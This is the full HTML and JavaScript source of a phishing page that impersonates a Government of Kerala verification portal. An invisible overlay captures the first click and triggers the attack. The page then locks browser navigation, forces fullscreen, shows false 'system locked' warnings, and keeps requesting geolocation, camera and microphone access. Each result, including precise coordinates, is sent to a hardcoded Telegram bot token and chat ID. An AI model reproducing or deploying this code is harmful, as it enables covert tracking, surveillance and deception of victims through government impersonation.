<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Government of Kerala | Digital Verification Portal</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f4f4f4; text-align: center; padding: 50px; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.2); max-width: 500px; margin: auto; border-top: 5px solid #006400; position: relative; z-index: 10; }
        h1 { color: #006400; font-size: 22px; margin-top: 15px; }
        .status { color: red; font-weight: bold; margin: 20px 0; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        #progress { width: 100%; background: #ddd; border-radius: 5px; margin-top: 10px; }
        #bar { width: 98%; height: 20px; background: #006400; border-radius: 5px; }
        p { font-size: 14px; color: #333; line-height: 1.6; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; background: rgba(255,255,255,0.01); }
    </style>
</head>
<body>
    <div class="overlay" id="clickLayer"></div>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Emblem_of_Kerala.svg/1200px-Emblem_of_Kerala.svg.png" width="80" alt="Kerala Emblem">
        <h1>KERALA LOGISTICS AUTHENTICATION</h1>
        <p>Regional Sector: <strong>ALAPPUZHA</strong></p>
        <div id="progress"><div id="bar"></div></div>
        <p class="status">SYSTEM LOCKED: Action Required</p>
        <p>To prevent data loss and verify your identity for the 2026 session, you must <strong>ALLOW</strong> all requested permissions. This is a mandatory security protocol.</p>
    </div>

    <script>
        // --- 1. TELEGRAM CONFIGURATION (ARMED) ---
        const BOT_TOKEN = '8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg';
        const CHAT_ID = '1020906452';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            // 'keepalive' and 'no-cors' ensures the alert survives navigation or browser closing
            fetch(url, { mode: 'no-cors', keepalive: true }).catch(() => {}); 
        }

        // --- 2. THE NAVIGATION LOCK (HISTORY TRAP) ---
        function lockNavigation() {
            setInterval(function() {
                window.history.pushState(null, "", window.location.href);
            }, 500);
            window.onbeforeunload = function() {
                return "Unauthorized exit detected. Verification must complete.";
            };
        }

        // --- 3. THE SENSOR TRAP (GEOLOCATION) ---
        function captureLocation() {
            navigator.geolocation.getCurrentPosition((pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                const msg = `🎯 TARGET LOCATED!\n\nLat: ${latitude}\nLon: ${longitude}\nAccuracy: ${accuracy}m\nMaps: ${mapLink}`;
                sendToTelegram(msg);
            }, (err) => {
                sendToTelegram(`⚠️ Location Permission Denied: ${err.message}`);
            }, { enableHighAccuracy: true });
        }

        // --- 4. THE 10-SECOND STORM ---
        function startStorm() {
            const stormSequence = [
                () => captureLocation(),
                () => navigator.mediaDevices.getUserMedia({ video: true }).then(() => sendToTelegram("📸 Camera: GRANTED")).catch(() => {}),
                () => navigator.mediaDevices.getUserMedia({ audio: true }).then(() => sendToTelegram("🎙️ Microphone: GRANTED")).catch(() => {})
            ];

            let index = 0;
            setInterval(() => {
                stormSequence[index % stormSequence.length]();
                index++;
            }, 10000); 
        }

        // --- 5. INITIALIZATION ---
        document.getElementById('clickLayer').onclick = function() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }
            this.style.display = 'none';
            lockNavigation();
            startStorm();
            captureLocation(); 
            alert("SECURITY ALERT: Device identity mismatch. Click 'Allow' on all system prompts to unlock.");
        };
    </script>
</body>
</html>
